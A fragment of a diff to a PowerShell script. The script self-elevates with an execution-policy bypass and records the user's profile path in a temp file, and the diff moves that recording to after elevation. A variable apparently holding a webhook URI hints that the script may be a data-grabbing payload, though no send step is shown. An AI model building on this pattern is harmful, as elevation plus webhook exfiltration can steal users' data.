@@ -34,8 +34,6 @@ If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]:
     Switch ($Prompt) {
         OK {
             Write-Host "This script will self elevate to run as an Administrator and continue."
-            $fpath = $env:USERPROFILE
-            $fpath | Out-File -FilePath "$env:temp/homepath.txt"
             sleep 1
             Start-Process PowerShell.exe -ArgumentList ("-NoProfile -ExecutionPolicy Bypass -File `"{0}`"" -f $PSCommandPath) -Verb RunAs
             Exit
@@ -47,6 +45,8 @@ If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]:
     }
 }
 
+$fpath = $env:USERPROFILE
+$fpath | Out-File -FilePath "$env:temp/homepath.txt"
 
 $whuri = "$dc"
 
